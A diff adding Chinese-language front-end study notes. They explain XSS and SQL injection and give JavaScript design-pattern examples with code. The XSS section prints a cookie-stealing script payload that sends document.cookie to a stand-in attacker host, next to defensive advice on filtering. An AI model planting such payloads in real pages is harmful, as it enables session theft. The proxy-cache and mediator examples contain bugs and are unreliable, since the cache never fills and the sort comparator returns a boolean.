@@ -1,3 +1,438 @@
+### XSS攻击
+
+~~~css
+xss攻击（cross site script）跨站脚步攻击
+原理：恶意攻击者在web页面中插入一些恶意的脚步代码，当用户浏览该页面时，那么嵌入到web页面中的script代码会执行。
+主要类型：反射型、存储型、DOM-based型,反射型和DOM-based称为非持久型xss攻击。存储型称为持久性攻击
+
+反射型案例：邮件中嵌入链接地址的按钮或接口，当用户点击xxs 攻击恶意链接时候，页面会跳转到攻击者预先准备的页面，然后会返回攻击者准备的js脚本，该js脚本就在浏览器中执行了
+xss攻击很容易拿到对方的cookie信息
+
+存储型原理：将恶意代码上传或存储到服务器中，下次只要访问者浏览包含恶意代码的页面就会执行恶意代码
+
+案例：
+比如我现在做了一个博客网站，然后攻击者在上面发布了一篇文章，内容是如下：<script>window.open("www.gongji.com?param="+document.cookie)</script> 如果我没有对该文章进行任何处理的话，直接存入到数据库中，那么下一次当其他用户访问该文章的时候，服务器会从数据库中读取后然后响应给客户端，那么浏览器就会执行这段脚本，然后攻击者就会获取到用户的cookie，然后会把cookie发送到攻击者的服务器上了。
+
+如何防范：
+1. 后端需要对提交的数据进行过滤。
+2. 前端也可以做一下处理方式，比如对script标签，将特殊字符替换成HTML编码这些等。
+
+DOM XSS 是基于文档对象模型的XSS。一般有如下DOM操作：
+1. 使用document.write直接输出数据。
+2. 使用innerHTML直接输出数据。
+3. 使用location、location.href、location.replace、iframe.src、document.referer、window.name等这些。
+
+~~~
+
+### SQL注入
+
+~~~css
+客户端把sql命令注入到一个应用的数据库中，而执行数据库执行恶意的sql命令
+~~~
+
+
+
+### js设计模式
+
+#### 什么是设计模式
+
+~~~css
+案例假设：有一个空房间，需要不断将东西放进房间。最简单的方式是把这些东西直接扔进去，但是很难快速的从这个房间中找到自己想要的东西。所以我们会在放在放一些柜子，在相应的柜子中放入东西。
+
+设计模式有助于写出可以复用和可维护性高的程序
+设计模式的原则：找出程序中变化的地方，并将变化封装起来，关键是意图，而不是结构
+~~~
+
+#### 模式类型
+
+~~~css
+1.单例模式
+2.策略模式
+3.代理模式
+4.发布订阅模式/观察者模式
+5.组合模式
+6.模板方法模式
+7.中介者模式
+~~~
+
+##### 单例模式
+
+~~~js
+function SetManager(name) {
+    this.manager = name;
+}
+
+SetManager.prototype.getName = function() {
+    console.log(this.manager);
+};
+
+var SingletonSetManager = (function() {
+    var manager = null;
+
+    return function(name) {
+        if (!manager) {
+            manager = new SetManager(name);
+        }
+
+        return manager;
+    } 
+})();
+
+SingletonSetManager('a').getName(); // a
+SingletonSetManager('b').getName(); // a
+SingletonSetManager('c').getName(); // a
+~~~
+
+##### 策略模式
+
+~~~js
+定义一系列的算法或方法，把他们一个个封装起来，使他们可以互相替换
+策略模式至少有两个模式组成：
+1.策略组：封装来具体的方法或算法，负责具体的计算过程。
+2.环境类Context，接收客户的请求，随后将某个请求委托给某个策略组
+
+// 错误提示
+var errorMsgs = {
+    default: '输入数据格式不正确',
+    minLength: '输入数据长度不足',
+    isNumber: '请输入数字',
+    required: '内容不为空'
+};
+
+// 规则集
+var rules = {
+    minLength: function(value, length, errorMsg) {
+        if (value.length < length) {
+            return errorMsg || errorMsgs['minLength']
+        }
+    },
+    isNumber: function(value, errorMsg) {
+        if (!/\d+/.test(value)) {
+            return errorMsg || errorMsgs['isNumber'];
+        }
+    },
+    required: function(value, errorMsg) {
+        if (value === '') {
+            return errorMsg || errorMsgs['required'];
+        }
+    }
+};
+
+// 校验器
+function Validator() {
+    this.items = [];
+};
+
+Validator.prototype = {
+    constructor: Validator,
+    
+    // 添加校验规则
+    add: function(value, rule, errorMsg) {
+        var arg = [value];
+
+        if (rule.indexOf('minLength') !== -1) {
+            var temp = rule.split(':');
+            arg.push(temp[1]);
+            rule = temp[0];
+        }
+
+        arg.push(errorMsg);
+
+        this.items.push(function() {
+            // 进行校验
+            return rules[rule].apply(this, arg);
+        });
+    },
+    
+    // 开始校验
+    start: function() {
+        for (var i = 0; i < this.items.length; ++i) {
+            var ret = this.items[i]();
+            
+            if (ret) {
+                console.log(ret);
+                // return ret;
+            }
+        }
+    }
+};
+
+// 测试数据
+function testTel(val) {
+    return val;
+}
+
+var validate = new Validator();
+
+validate.add(testTel('ccc'), 'isNumber', '只能为数字'); // 只能为数字
+validate.add(testTel(''), 'required'); // 内容不为空
+validate.add(testTel('123'), 'minLength:5', '最少5位'); // 最少5位
+validate.add(testTel('12345'), 'minLength:5', '最少5位');
+
+var ret = validate.start();
+
+console.log(ret);
+~~~
+
+##### 代理模式
+
+~~~js
+定义：为一个对象提供一个代用品或占位符，以便控制对它的访问
+代理模式主要有三种：保护代理、虚拟代理、缓存代理
+函数防抖节流
+// 主体
+function add() {
+    var arg = [].slice.call(arguments);
+
+    return arg.reduce(function(a, b) {
+        return a + b;
+    });
+}
+
+// 代理
+var proxyAdd = (function() {
+    var cache = [];
+
+    return function() {
+        var arg = [].slice.call(arguments).join(',');
+        
+        // 如果有，则直接从缓存返回
+        if (cache[arg]) {
+            return cache[arg];
+        } else {
+            var ret = add.apply(this, arguments);
+            return ret;
+        }
+    };
+})();
+
+console.log(
+    add(1, 2, 3, 4),
+    add(1, 2, 3, 4),
+
+    proxyAdd(10, 20, 30, 40),
+    proxyAdd(10, 20, 30, 40)
+); // 10 10 100 100
+~~~
+
+#### 发布订阅模式/观察者模式
+
+~~~css
+定义了对象中的一对多的依赖关系，当一个对象的状态发生改变时，所有依赖于它的对象都将得到通知
+js中通常使用注册回调函数的形式来订阅，js中的事件就是发布订阅模式
+
+// 订阅
+document.body.addEventListener('click', function() {
+    console.log('click1');
+}, false);
+
+document.body.addEventListener('click', function() {
+    console.log('click2');
+}, false);
+
+// 发布
+document.body.click(); // click1  click2
+
+// 观察者
+var observer = {
+    // 订阅集合
+    subscribes: [],
+
+    // 订阅
+    subscribe: function(type, fn) {
+        if (!this.subscribes[type]) {
+            this.subscribes[type] = [];
+        }
+        
+        // 收集订阅者的处理
+        typeof fn === 'function' && this.subscribes[type].push(fn);
+    },
+
+    // 发布  可能会携带一些信息发布出去
+    publish: function() {
+        var type = [].shift.call(arguments),
+            fns = this.subscribes[type];
+        
+        // 不存在的订阅类型，以及订阅时未传入处理回调的
+        if (!fns || !fns.length) {
+            return;
+        }
+        
+        // 挨个处理调用
+        for (var i = 0; i < fns.length; ++i) {
+            fns[i].apply(this, arguments);
+        }
+    },
+    
+    // 删除订阅
+    remove: function(type, fn) {
+        // 删除全部
+        if (typeof type === 'undefined') {
+            this.subscribes = [];
+            return;
+        }
+
+        var fns = this.subscribes[type];
+
+        // 不存在的订阅类型，以及订阅时未传入处理回调的
+        if (!fns || !fns.length) {
+            return;
+        }
+
+        if (typeof fn === 'undefined') {
+            fns.length = 0;
+            return;
+        }
+
+        // 挨个处理删除
+        for (var i = 0; i < fns.length; ++i) {
+            if (fns[i] === fn) {
+                fns.splice(i, 1);
+            }
+        }
+    }
+};
+
+// 订阅岗位列表
+function jobListForA(jobs) {
+    console.log('A', jobs);
+}
+
+function jobListForB(jobs) {
+    console.log('B', jobs);
+}
+
+// A订阅了笔试成绩
+observer.subscribe('job', jobListForA);
+// B订阅了笔试成绩
+observer.subscribe('job', jobListForB);
+
+
+// A订阅了笔试成绩
+observer.subscribe('examinationA', function(score) {
+    console.log(score);
+});
+
+// B订阅了笔试成绩
+observer.subscribe('examinationB', function(score) {
+    console.log(score);
+});
+
+// A订阅了面试结果
+observer.subscribe('interviewA', function(result) {
+    console.log(result);
+});
+
+observer.publish('examinationA', 100); // 100
+observer.publish('examinationB', 80); // 80
+observer.publish('interviewA', '备用'); // 备用
+
+observer.publish('job', ['前端', '后端', '测试']); // 输出A和B的岗位
+
+
+// B取消订阅了笔试成绩
+observer.remove('examinationB');
+// A都取消订阅了岗位
+observer.remove('job', jobListForA);
+
+observer.publish('examinationB', 80); // 没有可匹配的订阅，无输出
+observer.publish('job', ['前端', '后端', '测试']); // 输出B的岗位
+~~~
+
+#### 组合模式
+
+~~~js
+用小的子对象构建更大的对象，而这些小的子对象本身也许是由更小的孙对象构成的
+
+可以用树形结构来表示这种“部分- 整体”的层次结构。
+
+调用组合对象 的execute方法，程序会递归调用组合对象下面的叶对象的execute方法
+~~~
+
+![zuhe](assets/zuhe.png)
+
+#### 模板方法模式
+
+~~~js
+有两个部分组成，第一个部分为抽象父类，第二个部分为具体的实现子类
+由父类分离出公共部分，要求子类重写某些父类的（易变化的）抽象方法
+模板方法模式一般的实现方式为继承
+~~~
+
+
+
+#### 中介者模式
+
+~~~js
+使网状的多对多关系变成了相对简单的一对多关系（复杂的调度处理都交给中介者）
+~~~
+
+
+
+![duotuiduo](assets/duotuiduo.png)![yiduiduo](assets/yiduiduo.png)
+
+~~~js
+
+var A = {
+    score: 10,
+
+    changeTo: function(score) {
+        this.score = score;
+
+        // 自己获取
+        this.getRank();
+    },
+    
+    // 直接获取
+    getRank: function() {
+        var scores = [this.score, B.score, C.score].sort(function(a, b) {
+            return a < b;
+        });
+
+        console.log(scores.indexOf(this.score) + 1);
+    }
+};
+
+var B = {
+    score: 20,
+
+    changeTo: function(score) {
+        this.score = score;
+
+        // 通过中介者获取
+        rankMediator(B);
+    }
+};
+
+var C = {
+    score: 30,
+
+    changeTo: function(score) {
+        this.score = score;
+
+        rankMediator(C);
+    }
+};
+
+// 中介者，计算排名
+function rankMediator(person) {
+    var scores = [A.score, B.score, C.score].sort(function(a, b) {
+        return a < b;
+    });
+
+    console.log(scores.indexOf(person.score) + 1);
+}
+
+// A通过自身来处理
+A.changeTo(100); // 1
+
+// B和C交由中介者处理
+B.changeTo(200); // 1
+C.changeTo(50); // 3
+~~~
+
+
+
 ### npm
 
 ~~~css
@@ -126,6 +561,22 @@ convertImage:mammoth.images.eleTarget(function(image){
 
 ~~~
 
+### docx-templates 自定义模板生成docx文档
+
+#### 自定义命令界定符 cmdDelimiter
+
+~~~js
+cmdDelimiter:['{','}']//自定义的模板 命令界定符 默认值是 "+++"
+在模板文档中{name} {age} {hobby} 
+createReport({data:{name,age,hobby}})
+~~~
+
+#### 使用默认的Query查询语句
+
+~~~css
+
+~~~
+
 
 
 ### accesscontrol：基于角色和属性的访问控制
@@ -139,8 +590,6 @@ profile:配置文件
 video:
 
 ~~~
-
-
 
 #### 过滤方法
 
@@ -258,6 +707,14 @@ zhangsan=PM+admin 角色
 >     //在中间件中使用的时候是不需要立即调用的
 >     app.use('/api',userRouter)//userRouter不需要加（）立即调用
 >     ~~~
+> ~~~
+> 
+> ~~~
+>
+> ~~~
+> 
+> ~~~
+>
 > ~~~
 > 
 > ~~~
